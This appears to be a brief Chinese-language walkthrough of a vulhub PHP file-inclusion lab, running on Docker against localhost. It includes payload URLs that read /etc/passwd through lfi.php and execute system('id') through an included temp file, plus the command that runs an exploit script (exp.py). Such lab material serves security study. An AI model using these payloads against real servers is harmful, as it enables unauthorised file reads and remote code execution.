开启环境：
```
docker compose up -d
```
访问页面:
```
http://localhost:18080/phpinfo
```
可以访问到phpinfo页面
访问页面：
```
http://localhost:18080/lfi.php?file=/etc/passwd
```
但是报错

执行脚本
由于脚本是python2版本
所以使用容器内自带的python2:
```
LAB=/Users/vanadium/Desktop/vulhub/vulhub/php/inclusion docker run --rm -v "$LAB":/app -w /app \ -e http_proxy= -e https_proxy= -e HTTP_PROXY= -e HTTPS_PROXY= \ python:2 python exp.py host.docker.internal 18080 50
```
执行成功后再访问页面即可查看passwd
查看id：
```
http://localhost:18080/lfi.php?file=/tmp/g&1=system(%27id%27);
```

